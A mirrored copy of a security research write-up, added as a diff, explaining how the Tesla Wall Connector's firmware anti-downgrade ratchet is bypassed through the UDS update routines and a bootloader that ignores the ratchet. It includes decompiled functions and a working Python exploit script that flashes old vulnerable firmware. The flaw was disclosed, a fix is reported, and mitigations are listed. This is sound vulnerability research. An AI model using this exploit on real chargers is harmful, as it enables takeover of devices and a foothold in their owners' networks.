@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>James Routley | Feed</title>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="../styles.css"
+      media="screen"
+    />
+  </head>
+  <body>
+    <a href="/index.html">Back</a>
+    <a href="https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing">Original</a>
+    <h1>Tesla Wall Connector bootloader bypasses the firmware downgrade ratchet</h1>
+    
+    <div id="readability-page-1" class="page"><div property="schema:text"><h2>A quick recap of the update procedure</h2>
+<p>We described the full update flow over Single-Wire CAN in the <a href="https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector">first article</a>. In short:</p>
+<ol>
+<li>Open a UDS session (type <code>2</code>).</li>
+<li>Authenticate with Security Access (level <code>5</code>, XOR-<code>0x35</code> algorithm).</li>
+<li>Run routine <code>0xFF00</code> to prepare and erase the passive slot.</li>
+<li>Write <code>0x0E</code> to identifier <code>0x102</code> to mark the slot as “settable via UDS”.</li>
+<li>Push the firmware with <code>Request Download</code> / <code>Transfer Data</code> / <code>Request Transfer Exit</code>.</li>
+<li>Run routine <code>0x201</code> to validate the freshly written image and switch slots.</li>
+<li>Run routine <code>0x202</code> to reboot.</li>
+</ol>
+<p>As a reminder, the AW-CU300 uses two firmware slots: one <strong>active</strong> (currently running) and one <strong>passive</strong> (target of the update). After a successful update, slots flip and the new firmware becomes active on next boot.</p>
+
+<h2>What changed in 24.44.3</h2>
+
+<p>After diffing the old firmware against version <code>24.44.3</code>, we focused on <code>switch_to_new_firmware()</code>, the function that handles UDS routine <code>0x201</code>:</p>
+<pre><code>int switch_to_new_firmware()
+{
+    ...
+    if ( settable_via_uds != 14 || !passive_firmware )
+        return 1;
+    if ( passive &lt;= 0
+      || passive &gt; passive_firmware-&gt;size
+      || (v2 = check_signature(passive_firmware-&gt;start, passive)) != 0
+      || !check_image_and_antidowngrade(nullptr) )
+    {
+        part_erase(flash_drv, passive_firmware-&gt;start, 0x14u);
+        v2 = 4;
+    }
+    else
+    {
+        part_write_layout(passive_firmware);
+    }
+    flash_drv_close(flash_drv);
+    passive_firmware = nullptr;
+    return v2;
+}</code></pre>
+<p><code>check_image_and_antidowngrade()</code> is new. It parses the firmware segments, recomputes their CRCs, then calls <code>verify_firmware_segments_platform()</code> for the ratchet comparison:</p>
+<pre><code>int verify_firmware_segments_platform(int flash_drv, u32_t *segments, ...)
+{
+    ...
+    // Walk the segments looking for the version descriptor in the
+    // segment that ends in the [0x100000 .. 0x100010] window.
+    ...
+    if ( buffer.next != (netif *)&#39;NSRV&#39; /* &#34;VRSN&#34; */ )
+        goto next_segment;
+
+    major = LOBYTE(buffer.ip_addr.addr);
+    minor = BYTE1(buffer.ip_addr.addr);
+
+    if ( buffer.netmask.addr == &#39;2SRV&#39; /* &#34;VRS2&#34; */
+      &amp;&amp; LOBYTE(buffer.gw.addr) &gt; 1u )
+        firmware_ratchet = BYTE2(buffer.gw.addr);
+    else
+        firmware_ratchet = 0;
+    ...
+
+    sub_1F04866C(&amp;current_ratchet);   // read ratchet from PSM (persistent storage)
+
+    if ( current_ratchet &lt;= firmware_ratchet
+      || !call_psm_wrapper(...) )
+    {
+        return 0;                     // accepted
+    }
+
+    log(&#34;Failure: Security ratchet downgrade prevented %d &lt; %d&#34;,
+        firmware_ratchet, current_ratchet);
+    return -1;
+}</code></pre>
+<p>Version information is embedded in firmware segments (<code>VRSN</code> for the version, <code>VRS2</code> for the ratchet), in the segment that loads near <code>0x100000</code>. Only the updater parses this, not the bootloader. On the device side, the ratchet lives in PSM (Persistent Storage Manager) and gets incremented when a higher-ratchet image is activated.</p>
+<p>So on a <code>24.44.3</code> device, sending the old <code>0.8.58</code> firmware and calling routine <code>0x201</code> terminates with:</p>
+<pre><code>ERROR verify_firmware_segments_platform:145
+Failure: Security ratchet downgrade prevented 0 &lt; N</code></pre>
+<p>And the slot gets immediately erased. There is no way to keep an old image in flash through the official path.</p>
+<h2>The bootloader doesn&#39;t care</h2>
+<p><code>boot2</code>, as it is called in the build artifacts, sits in flash at a fixed address and is <strong>not</strong> part of any firmware update shipped by Tesla. We had to dump the flash from a charger we previously rooted via the original Pwn2Own exploit to analyze it.</p>
+<p>It does perform several checks on the active firmware before jumping to it:</p>
+<ul>
+<li>Magic header (<code>SBFH</code>).</li>
+<li>Per-segment CRC32.</li>
+<li>RSA signature against a key from the keystore.</li>
+</ul>
+<p>But it has <strong>no notion of a security ratchet</strong>. Any firmware image with a valid signature and correct CRC will execute, regardless of its version. Neither <code>boot2</code> nor the bootrom implement secure boot. So the anti-downgrade is enforced exclusively by one piece of code, <code>switch_to_new_firmware()</code>, at one moment: when routine <code>0x201</code> is called.</p>
+<p>So: can we get an old, signed firmware into the <strong>active</strong> slot without ever calling routine <code>0x201</code> on it?</p>
+<h2>How a slot becomes active</h2>
+<p>Routine <code>0xFF00</code> calls <code>prepare_passive_slot()</code>, which selects which physical slot is &#34;passive&#34; based on the current boot flags, then erases it:</p>
+<pre><code>int prepare_passive_slot(int a1, int a2, int a3)
+{
+    partition_entry *f1, *f2;
+    int16_t v7 = 0;
+
+    if ( part_read_layout(a1, a2, a3)
+      || (f1 = part_get_layout_by_id(1, &amp;v7),
+          f2 = part_get_layout_by_id(1, &amp;v7),
+          !f1)
+      || !f2 )
+    {
+        passive_firmware = nullptr;
+        __und(0xFFu);
+    }
+
+    if ( (g_boot_flags &amp; 3) != 0 )    // we booted from slot 1?
+        f2 = f1;                      // then passive is slot 0
+
+    passive_firmware = f2;
+    ...
+    if ( part_erase(flash_drv, dword_115200, dword_115204) &lt; 0 )
+        ...
+    return 0;
+}</code></pre>
+<p><code>part_get_layout_by_id()</code> is iterator-based: first call returns the first partition entry with id 1, second call returns the next one. Depending on <code>g_boot_flags</code>, one or the other becomes passive.</p>
+<p>Here is what matters: <code>g_boot_flags</code><strong> is set at boot time and never updated</strong>. It reflects which slot we booted from, not what the partition table currently says.</p>
+<p><code>part_write_layout()</code>, which flips slots, does not touch firmware data. It only rewrites the partition table by bumping a per-slot generation counter:</p>
+<pre><code>int part_write_layout(partition_entry *a1)
+{
+    ...
+    if ( /* a1 matches f1 */ )
+        v3-&gt;gen_level = v4-&gt;gen_level + 1;
+    else if ( /* a1 matches f2 */ )
+        v4-&gt;gen_level = v3-&gt;gen_level + 1;
+    else
+        return -23;
+
+    // erase + rewrite the 4KiB partition table area
+    part_erase(v8, partition_table_addr, 0x1000);
+    flash_write(v8, &amp;dword_129B7C, 16);
+    flash_write(v8, byte_1299FC, 24 * word_129B82);
+    flash_write(v8, &amp;checksum, 4);
+    ...
+}</code></pre>
+<p>On boot, the bootloader picks the slot with the highest <code>gen_level</code>. So to make a slot active for next boot, you only need <code>part_write_layout()</code> to succeed once for that slot. What happens to its content afterwards does not matter.</p>
+<h2>The bypass</h2>
+<p>To recap: routine <code>0xFF00</code> erases the physical passive slot based on <code>g_boot_flags</code> (which never changes during a session), routine <code>0x201</code> validates slot contents and writes the partition layout, and the bootloader trusts the partition table without checking the ratchet.</p>
+<p>With that in mind:</p>
+<ol>
+<li>Send a <strong>valid</strong>, up-to-date firmware to the passive slot. Call routine <code>0x201</code>. Validation passes; the partition layout is written, so this slot now has the highest <code>gen_level</code>.</li>
+<li>Without rebooting, call routine <code>0xFF00</code> again. Because <code>g_boot_flags</code> hasn’t changed, the same physical slot is selected as <strong>passive</strong>, and the firmware we just validated is erased. The partition table is not touched.</li>
+<li>Send an <strong>old</strong>, signed-but-vulnerable firmware to the now-empty slot.</li>
+<li>Skip routine <code>0x201</code> entirely (we don&#39;t need it, and it would refuse the image). Just call routine <code>0x202</code> to reboot.</li>
+</ol>
+<p>On reboot, the bootloader reads the partition table, picks the slot with the highest <code>gen_level</code> (the one we just rewrote), validates its signature (still valid, it is a properly signed firmware), and jumps in. The anti-downgrade check never ran on the old image.</p>
+<h2>Exploit</h2>
+<p>Our exploit is a small extension of the Pwn2Own car simulator. Single-Wire CAN setup, GPIO sequence, UDS plumbing: all unchanged. Only the update sequence is doubled:</p>
+<pre><code>with Client(conn, config=uds_config) as client:
+    client.set_config(&#39;security_algo&#39;, tesla_uds_algo)
+    client.change_session(2)
+    client.unlock_security_access(5)
+
+    # 1. Push a valid, up-to-date firmware and let routine 0x201
+    #    write the partition layout for us.
+    client.routine_control(routine_id=0xFF00, control_type=1)
+    client.write_data_by_identifier(0x102, 0x0E)
+    data = open(&#34;firmwares/WC3_RELEASE_FLEET_24.44.3.prodsigned.bin&#34;,&#34;rb&#34;).read()
+    send_firmware_data(client, data)
+    client.routine_control(routine_id=0x201, control_type=1)  # writes layout
+    sleep(1)
+
+    # 2. Re-prepare the same physical slot. The valid firmware gets
+    #    erased; the partition table is untouched.
+    client.routine_control(routine_id=0xFF00, control_type=1)
+    client.write_data_by_identifier(0x102, 0x0E)
+    data = open(&#34;firmwares/WC3_PROD_OTA_08.58.bin&#34;,&#34;rb&#34;).read()
+    send_firmware_data(client, data)
+    sleep(1)
+
+    # 3. Reboot. The bootloader will boot the old firmware because
+    #    the partition table still says this slot is the active one.
+    client.routine_control(routine_id=0x202, control_type=1)</code></pre>
+<p>Total run time is roughly 30 minutes on the 33.3 kbps SWCAN bus: twice the original Pwn2Own timing, since two full firmware images have to be sent over the cable. After reboot, version <code>0.8.58</code> is back in charge, and the rest of the original chain (UDS leak of the Wi-Fi credentials, telnet to the debug shell, buffer overflow in the argument parser) works exactly as before.</p>
+<h2>Conclusion</h2>
+<p>Because the anti-downgrade only lives in the updater and the bootloader does not check the ratchet, any sequence that commits the partition layout then overwrites the slot content bypasses it. Routine <code>0xFF00</code> lets us do exactly that: erase the firmware after the layout has been written, then write whatever we want.</p>
+<p>Enforcing the ratchet in the bootloader would close this gap. Other options: have routine <code>0xFF00</code> invalidate the partition layout entry when erasing a slot, so an erased-then-rewritten slot is never picked as bootable. Or simply force a reboot after a successful update, or reject any new update session once routine <code>0x201</code> has succeeded.</p>
+<p>We reported this vulnerability to Tesla and it was fixed in a firmware update several months ago. As with the first article, the Wall Connector typically sits on a home or business network, and a charger taken over via its charging cable becomes a foothold inside that network. On the bright side, Tesla&#39;s automatic OTA deployment to connected chargers means the fix reaches most devices quickly, reducing the exposure window in practice.</p>
+</div></div>
+  </body>
+</html>
